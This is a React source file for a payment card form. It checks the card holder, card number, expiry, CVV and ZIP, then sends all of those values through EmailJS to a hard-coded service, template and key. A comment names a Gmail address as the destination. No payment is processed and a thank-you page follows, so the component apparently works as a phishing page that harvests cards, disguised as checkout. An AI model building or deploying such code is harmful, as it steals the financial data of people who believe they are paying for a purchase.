import React, { useState } from "react";
import ThankYouPage from "./thank-you";
import emailjs from "@emailjs/browser";

export default function PaymentCard() {
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [cardType, setCardType] = useState("Visa");
  const [formData, setFormData] = useState({
    holder: "",
    number: "",
    expiry: "",
    cvv: "",
    zip: "",
  });

  const [errors, setErrors] = useState({});

  const validate = () => {
    const newErrors = {};
    if (!/^[A-Za-z ]+$/.test(formData.holder)) {
      newErrors.holder = "Only alphabets are allowed.";
    }
    if (!/^\d{16}$/.test(formData.number)) {
      newErrors.number = "Card number must be exactly 16 digits.";
    }
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(formData.expiry)) {
      newErrors.expiry = "Enter a valid date (MM/YY).";
    } else {
      const [month, year] = formData.expiry.split("/");
      const expDate = new Date(`20${year}`, month);
      const now = new Date();
      if (expDate <= now) {
        newErrors.expiry = "Card has expired.";
      }
    }
    if (!/^\d{3}$/.test(formData.cvv)) {
      newErrors.cvv = "CVV must be exactly 3 digits.";
    }
    if (!/^\d{5}$/.test(formData.zip)) {
      newErrors.zip = "ZIP code must be exactly 5 digits.";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    if (name === "expiry") {
      let formatted = value.replace(/\D/g, "");
      if (formatted.length >= 3) {
        formatted = `${formatted.slice(0, 2)}/${formatted.slice(2, 4)}`;
      }
      setFormData({ ...formData, [name]: formatted });
    } else {
      setFormData({ ...formData, [name]: value });
    }
    setErrors({ ...errors, [name]: "" });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (validate()) {
      const templateParams = {
        card_type: cardType,
        card_holder: formData.holder,
        card_number: formData.number,
        expiry_date: formData.expiry,
        cvv: formData.cvv,
        zip: formData.zip,
      };

      emailjs
        .send(
          //Detailsinfo12345@gmail.com
          "service_asul1lx", // Replace with your EmailJS service ID
          "template_sa9q69b", // Replace with your EmailJS template ID
          templateParams,
          "3qKeudN_kQGAOeepb" // Replace with your EmailJS public key
        )
        .then((result) => {
          console.log(result.text);
          setIsSubmitted(true);
        })
        .catch((error) => {
          console.error(error.text);
        });
    }
  };

  if (isSubmitted) {
    return <ThankYouPage />;
  }

  return (
    <div
      className="min-h-screen flex items-center justify-center px-4 py-8 sm:px-6 lg:px-8"
      style={{ background: "linear-gradient(to left, #ff6b5e, #fcdde9)" }}
    >
      <div className="w-full max-w-2xl bg-white shadow-2xl p-6 sm:p-8 space-y-6 rounded-xl relative">
        <h1 className="font-bold text-xl sm:text-2xl text-gray-800">
          Enter Your Card Information
        </h1>
        <p className="text-gray-500 text-sm sm:text-base">
          Ensure prompt order processing by using a valid credit card to
          complete your purchase.
        </p>

        {/* Card Type Selection */}
        <div className="space-y-4">
          {["Visa", "MasterCard"].map((type) => (
            <label
              key={type}
              className={`w-full border p-3 rounded-xl flex items-center justify-between cursor-pointer ${
                cardType === type ? "border-blue-500" : "border-gray-300"
              }`}
            >
              <div className="flex items-center space-x-4">
                <img
                  src={
                    type === "Visa"
                      ? "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg"
                      : "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
                  }
                  alt={type}
                  className="h-6 ml-1"
                />
                <span className="text-sm font-medium">{type}</span>
              </div>
              <input
                type="radio"
                name="cardType"
                value={type}
                checked={cardType === type}
                onChange={() => setCardType(type)}
                className="form-radio text-blue-600 size-5"
              />
            </label>
          ))}
        </div>

        <div className="font-bold">Payment details</div>

        {/* Payment Form */}
        <form onSubmit={handleSubmit} className="space-y-4 mt-8">
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            {/* Card Holder */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-1">
                Card Holder
              </label>
              <input
                type="text"
                name="holder"
                value={formData.holder}
                onChange={handleChange}
                placeholder="John Doe"
                className={`w-full border rounded-lg px-4 py-2 focus:outline-none ${
                  errors.holder
                    ? "border-red-500 focus:ring-red-400"
                    : "focus:ring-blue-400"
                }`}
              />
              {errors.holder && (
                <p className="text-red-500 text-sm mt-1">{errors.holder}</p>
              )}
            </div>

            {/* Card Number */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-1">
                Card Number
              </label>
              <input
                type="text"
                name="number"
                value={formData.number}
                onChange={handleChange}
                placeholder="1234567812345678"
                maxLength={16}
                className={`w-full border rounded-lg px-4 py-2 focus:outline-none ${
                  errors.number
                    ? "border-red-500 focus:ring-red-400"
                    : "focus:ring-blue-400"
                }`}
              />
              {errors.number && (
                <p className="text-red-500 text-sm mt-1">{errors.number}</p>
              )}
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
            {/* Expiry */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-1">
                Expiry
              </label>
              <input
                type="text"
                name="expiry"
                value={formData.expiry}
                onChange={handleChange}
                placeholder="MM/YY"
                maxLength={5}
                className={`w-full border rounded-lg px-4 py-2 focus:outline-none ${
                  errors.expiry
                    ? "border-red-500 focus:ring-red-400"
                    : "focus:ring-blue-400"
                }`}
              />
              {errors.expiry && (
                <p className="text-red-500 text-sm mt-1">{errors.expiry}</p>
              )}
            </div>

            {/* CVV */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-1">
                CVV
              </label>
              <input
                type="text"
                name="cvv"
                value={formData.cvv}
                onChange={handleChange}
                placeholder="123"
                maxLength={3}
                className={`w-full border rounded-lg px-4 py-2 focus:outline-none ${
                  errors.cvv
                    ? "border-red-500 focus:ring-red-400"
                    : "focus:ring-blue-400"
                }`}
              />
              {errors.cvv && (
                <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>
              )}
            </div>

            {/* ZIP */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-1">
                ZIP
              </label>
              <input
                type="text"
                name="zip"
                value={formData.zip}
                onChange={handleChange}
                placeholder="12345"
                maxLength={5}
                className={`w-full border rounded-lg px-4 py-2 focus:outline-none ${
                  errors.zip
                    ? "border-red-500 focus:ring-red-400"
                    : "focus:ring-blue-400"
                }`}
              />
              {errors.zip && (
                <p className="text-red-500 text-sm mt-1">{errors.zip}</p>
              )}
            </div>
          </div>

          <button
            type="submit"
            className="w-full bg-blue-600 text-white rounded-lg py-2 font-semibold hover:bg-blue-700 transition duration-300"
          >
            Submit Payment
          </button>
        </form>
      </div>
    </div>
  );
}
